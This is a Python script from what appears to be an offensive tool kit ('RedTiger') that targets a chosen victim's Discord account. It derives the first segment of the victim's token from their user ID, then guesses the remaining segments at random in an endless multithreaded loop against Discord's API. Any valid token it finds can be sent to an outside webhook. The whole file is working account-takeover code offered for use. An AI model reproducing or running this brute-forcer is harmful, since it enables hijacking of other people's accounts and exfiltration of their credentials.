# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import string
    import requests
    import json
    import random
    import threading
    import base64
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token To Id")
try:
    Slow(discord_banner)
    userid = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Victime ID -> {reset}")
    OnePartToken =  str(base64.b64encode(userid.encode("utf-8")), "utf-8")
    motifs = ["=", "==", "==="]
    for motif in motifs:
        if OnePartToken.endswith(motif):
            OnePartToken = OnePartToken[:-2]
    print(f'{BEFORE + current_time_hour() + AFTER} {INFO} Part One Token: {white}{OnePartToken}.{reset}')

    brute = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Find the second part by brute force ? (y/n) -> {reset}")
    if not brute in ['y', 'Y', 'Yes', 'yes', 'YES']:
        Continue()
        Reset()

    webhook = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {reset}")
    if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
        webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
    except:
        ErrorNumber()


    def send_webhook(embed_content):
        payload = {
        'embeds': [embed_content],
        'username': username_webhook,
        'avatar_url': avatar_webhook
        }

        headers = {
        'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    def token_check():
        first = OnePartToken
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{first}.{second}.{third}"

        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
            if response.status_code == 200:
                if webhook in ['y']:
                    embed_content = {
                    'title': f'Token Valid !',
                    'description': f"**Token:**\n```{token}```",
                    'color': color_webhook,
                    'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                    }
                    send_webhook(embed_content)
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                else:
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Token: {white}{token}{red}")
        except:
            print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Error{red} Token: {white}{token}{red}")

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=token_check)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)